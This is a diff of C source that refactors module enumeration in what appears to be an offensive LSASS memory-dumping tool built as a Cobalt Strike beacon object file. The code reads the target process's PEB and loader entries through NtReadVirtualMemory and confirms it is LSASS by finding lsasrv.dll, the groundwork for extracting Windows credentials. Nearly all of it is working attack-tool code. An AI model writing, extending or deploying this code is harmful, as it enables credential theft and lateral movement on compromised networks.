@@ -687,28 +687,20 @@ PVOID get_peb_address(
     return basic_info.PebBaseAddress;
 }
 
-Pmodule_info find_modules(
+PVOID get_module_list_address(
     HANDLE hProcess,
-    wchar_t* important_modules[],
-    int number_of_important_modules,
     BOOL is_lsass
 )
 {
-    // module list
-    Pmodule_info module_list = NULL;
-    BOOL lsasrv_found = FALSE;
-    SHORT pointer_size;
-    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address, first_ldr_entry_address;
+    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address;
 
     peb_address = get_peb_address(hProcess);
     if (!peb_address)
         return NULL;
 
 #if _WIN64
-    pointer_size = 8;
     ldr_pointer = peb_address + 0x18;
 #else
-    pointer_size = 4;
     ldr_pointer = peb_address + 0xc;
 #endif
 
@@ -716,7 +708,7 @@ Pmodule_info find_modules(
         hProcess,
         (PVOID)ldr_pointer,
         &ldr_address,
-        pointer_size,
+        sizeof(PVOID),
         NULL
     );
     if (status == STATUS_PARTIAL_COPY && !is_lsass)
@@ -747,7 +739,7 @@ Pmodule_info find_modules(
         hProcess,
         (PVOID)module_list_pointer,
         &ldr_entry_address,
-        pointer_size,
+        sizeof(PVOID),
         NULL
     );
     if (!NT_SUCCESS(status))
@@ -763,115 +755,160 @@ Pmodule_info find_modules(
         return NULL;
     }
 
-    first_ldr_entry_address = ldr_entry_address;
-    SHORT dlls_found = 0;
-    struct LDR_DATA_TABLE_ENTRY ldr_entry;
+    return ldr_entry_address;
+}
 
+Pmodule_info add_new_module(
+    HANDLE hProcess,
+    struct LDR_DATA_TABLE_ENTRY* ldr_entry
+)
+{
+    Pmodule_info new_module = (Pmodule_info)intAlloc(sizeof(module_info));
+    if (!new_module)
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
+            (ULONG32)sizeof(module_info),
+            KERNEL32$GetLastError());
+        return NULL;
+    }
+    new_module->next = NULL;
+    new_module->dll_base = (PVOID)ldr_entry->DllBase;
+    new_module->size_of_image = ldr_entry->SizeOfImage;
+
+    // read the full path of the DLL
+    NTSTATUS status = NtReadVirtualMemory(
+        hProcess,
+        (PVOID)ldr_entry->FullDllName.Buffer,
+        new_module->dll_name,
+        ldr_entry->FullDllName.Length,
+        NULL
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
+            status
+        );
+        return NULL;
+    }
+    return new_module;
+}
+
+BOOL read_ldr_entry(
+    HANDLE hProcess,
+    PVOID ldr_entry_address,
+    struct LDR_DATA_TABLE_ENTRY* ldr_entry,
+    wchar_t* base_dll_name
+)
+{
+    // read the entry
+    NTSTATUS status = NtReadVirtualMemory(
+        hProcess,
+        ldr_entry_address,
+        ldr_entry,
+        sizeof(struct LDR_DATA_TABLE_ENTRY),
+        NULL
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
+            status
+        );
+        return FALSE;
+    }
+    // initialize base_dll_name with all null-bytes
+    MSVCRT$memset(base_dll_name, 0, MAX_PATH);
+    // read the dll name
+    status = NtReadVirtualMemory(
+        hProcess,
+        (PVOID)ldr_entry->BaseDllName.Buffer,
+        base_dll_name,
+        ldr_entry->BaseDllName.Length,
+        NULL
+    );
+    if (!NT_SUCCESS(status))
+    {
+#ifdef BOF
+        BeaconPrintf(CALLBACK_ERROR,
+#else
+        printf(
+#endif
+            "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
+            status
+        );
+        return FALSE;
+    }
+    return TRUE;
+}
+
+Pmodule_info find_modules(
+    HANDLE hProcess,
+    wchar_t* important_modules[],
+    int number_of_important_modules,
+    BOOL is_lsass
+)
+{
+    // module list
+    Pmodule_info module_list = NULL;
+
+    // find the address of LDR_DATA_TABLE_ENTRY
+    PVOID ldr_entry_address = get_module_list_address(
+        hProcess,
+        is_lsass
+    );
+    if (!ldr_entry_address)
+        return NULL;
+
+    PVOID first_ldr_entry_address = ldr_entry_address;
+    SHORT dlls_found = 0;
+    BOOL lsasrv_found = FALSE;
+    struct LDR_DATA_TABLE_ENTRY ldr_entry;
+    wchar_t base_dll_name[MAX_PATH];
+    // loop over each DLL loaded, looking for the important modules
     while (dlls_found < number_of_important_modules)
     {
-        // read the entry
-        status = NtReadVirtualMemory(
+        // read the current entry
+        BOOL success = read_ldr_entry(
             hProcess,
             ldr_entry_address,
             &ldr_entry,
-            sizeof(struct LDR_DATA_TABLE_ENTRY),
-            NULL
+            base_dll_name
         );
-        if (!NT_SUCCESS(status))
-        {
-#ifdef BOF
-            BeaconPrintf(CALLBACK_ERROR,
-#else
-            printf(
-#endif
-                "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
-                status
-            );
+        if (!success)
             return NULL;
-        }
 
-        BOOL has_read_name = FALSE;
-        wchar_t base_dll_name[256];
-        // check if this dll is one of the dlls we are looking for
+        // loop over each important module and see if we have a match
         for (int i = 0; i < number_of_important_modules; i++)
         {
-            SHORT length = MSVCRT$wcsnlen(important_modules[i], 0xFF);
-
-            // if the length of the name doesn't match, continue
-            if (length * 2 != ldr_entry.BaseDllName.Length)
-                continue;
-
-            if (!has_read_name)
-            {
-                // initialize base_dll_name with all null-bytes
-                MSVCRT$memset(base_dll_name, 0, sizeof(base_dll_name));
-                // read the dll name
-                status = NtReadVirtualMemory(
-                    hProcess,
-                    (PVOID)ldr_entry.BaseDllName.Buffer,
-                    base_dll_name,
-                    ldr_entry.BaseDllName.Length,
-                    NULL
-                );
-                if (!NT_SUCCESS(status))
-                {
-#ifdef BOF
-                    BeaconPrintf(CALLBACK_ERROR,
-#else
-                    printf(
-#endif
-                        "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
-                        status
-                    );
-                    return NULL;
-                }
-                has_read_name = TRUE;
-            }
-
-            // compare the DLL's name, case insensitive
+            // compare the DLLs' name, case insensitive
             if (!MSVCRT$_wcsicmp(important_modules[i], base_dll_name))
             {
-                // check if the DLL is 'lsasrv.dll' so that we know the process is LSASS
+                // check if the DLL is 'lsasrv.dll' so that we know the process is indeed LSASS
                 if (!MSVCRT$_wcsicmp(important_modules[i], L"lsasrv.dll"))
                     lsasrv_found = TRUE;
 
-                Pmodule_info new_module = (Pmodule_info)intAlloc(sizeof(module_info));
-                if (!new_module)
-                {
-#ifdef BOF
-                    BeaconPrintf(CALLBACK_ERROR,
-#else
-                    printf(
-#endif
-                        "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
-                        (ULONG32)sizeof(module_info),
-                        KERNEL32$GetLastError());
-                    return NULL;
-                }
-                new_module->next = NULL;
-                new_module->dll_base = (PVOID)ldr_entry.DllBase;
-                new_module->size_of_image = ldr_entry.SizeOfImage;
-
-                // read the full path of the DLL
-                status = NtReadVirtualMemory(
+                // add the new module to the linked list
+                Pmodule_info new_module = add_new_module(
                     hProcess,
-                    (PVOID)ldr_entry.FullDllName.Buffer,
-                    new_module->dll_name,
-                    ldr_entry.FullDllName.Length,
-                    NULL
+                    &ldr_entry
                 );
-                if (!NT_SUCCESS(status))
-                {
-#ifdef BOF
-                    BeaconPrintf(CALLBACK_ERROR,
-#else
-                    printf(
-#endif
-                        "Failed to call NtReadVirtualMemory, status: 0x%lx\n",
-                        status
-                    );
+                if (!new_module)
                     return NULL;
-                }
+
                 if (!module_list)
                 {
                     module_list = new_module;
@@ -887,12 +924,13 @@ Pmodule_info find_modules(
             }
         }
 
-        // next entry
+        // set the next entry as the current entry
         ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
-        // if we are back at the beginning, return
+        // if we are back at the beginning, break
         if (ldr_entry_address == first_ldr_entry_address)
             break;
     }
+    // the LSASS process should always have 'lsasrv.dll' loaded
     if (is_lsass && !lsasrv_found)
     {
 #ifdef BOF
